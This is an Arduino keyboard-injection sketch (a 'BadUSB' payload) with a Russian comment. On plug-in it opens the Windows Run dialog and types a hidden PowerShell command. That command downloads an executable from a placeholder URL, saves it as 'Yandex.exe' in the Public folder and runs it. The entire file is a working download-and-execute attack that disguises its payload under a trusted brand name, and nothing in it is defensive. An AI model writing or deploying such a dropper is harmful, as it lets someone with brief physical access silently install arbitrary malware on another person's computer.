#include <Keyboard.h>



void setup()
{
  delay(1000);
  Keyboard.begin();
  Keyboard.press(KEY_LEFT_GUI);
  delay(120);
  Keyboard.print("r");
  Keyboard.releaseAll();
  delay(500);

  String command = "& {Invoke-WebRequest -Uri 'https://ССЫЛКА_НА_ПРЯМУЮ_ЗАГРУЗКУ' -OutFile 'C:\\Users\\Public\\Yandex.exe'}; Start-Process 'C:\\Users\\Public\\Yandex.exe'";
  //Загрузка файла и запуск
  Keyboard.print("powershell -WindowStyle Hidden -command \"" + command + "\"");
  delay(300);
  Keyboard.write(0xE0);

}

void loop() {
  
}
